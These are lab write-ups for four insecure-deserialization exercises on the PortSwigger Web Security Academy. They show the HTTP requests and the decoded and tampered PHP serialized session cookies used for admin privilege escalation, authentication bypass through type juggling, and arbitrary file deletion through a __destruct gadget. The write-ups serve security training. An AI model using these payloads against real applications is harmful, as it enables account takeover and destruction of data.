## Lab - 1: Modifying serialized objects (A)

- This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account. You can log in to your own account using the following credentials: wiener:peter

- enter with the user `wiener` and at my-account page

```
GET /my-account HTTP/1.1
Host: 0af2008803bc0d5cc0878b8500100022.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
...
```

- we are interested in the `Cookie: session` and if select that value ('Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d') in Burp (after decoding from URL and base64), the following result will be seen.

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

- send it to Repeater and change the `b:0` to `b:1`

- then send request to `/admin` and found an admin interface

```
GET /admin/delete?username=carlos HTTP/1.1
Host: 0af2008803bc0d5cc0878b8500100022.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3d
...
```

---

## Lab - 2: Modifying serialized data types (P)

- This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter

- login with wiener
- session cookie is as follow:

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkY3FvNWVqcHo2dHR3aWEzcDlka3AwbGR5bm13YjhpdyI7fQ%3d%3d
```

- after encoding

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dcqo5ejpz6ttwia3p9dkp0ldynmwb8iw";}
```

- if try to access `/admin` panel -> 401 response

- change the session cookie as follow:

```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

- the encoded version as follow

```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

- now we can access as administrator

---

## Lab - 3: Using application functionality to exploit insecure deserialization (P)

- This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory. You can log in to your own account using the following credentials: wiener:peter ;You also have access to a backup account: gregg:rosebud

- login with `wiener` account and Delete the account
- grep the POST request of delete

```
POST /my-account/delete HTTP/1.1
Host: 0a81005a0389f349c00ec163003900e5.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3NTFpdjI4YmZlcnFqb3hqNmw5d2tjMzZ5em13dXNuYyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
```

- after decoding the session cookie:

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"w51iv28bferqjoxj6l9wkc36yzmwusnc";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

- changing the cookie into

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"w51iv28bferqjoxj6l9wkc36yzmwusnc";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

- then decode and send this request

---

## Lab - 4: Arbitrary object injection in PHP (P)

- This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter

- login with `wiener`
- in Burp sitemap, there is a file at `/libs/CustomTemplate.php`
- GET request to this file appending `~` to read the source code, like this

```
GET /libs/CustomTemplate.php~ HTTP/1.1
Host: 0a9f00900498ae1cc14c3e3a00b40062.web-security-academy.net
```

- in response, find a magic function `__destruct()`

```php
<?php
class CustomTemplate {
    ...
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}
?>
```

- send a request containing the session cookie to Burp Repeater
- replace the session cookie with the following

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

---
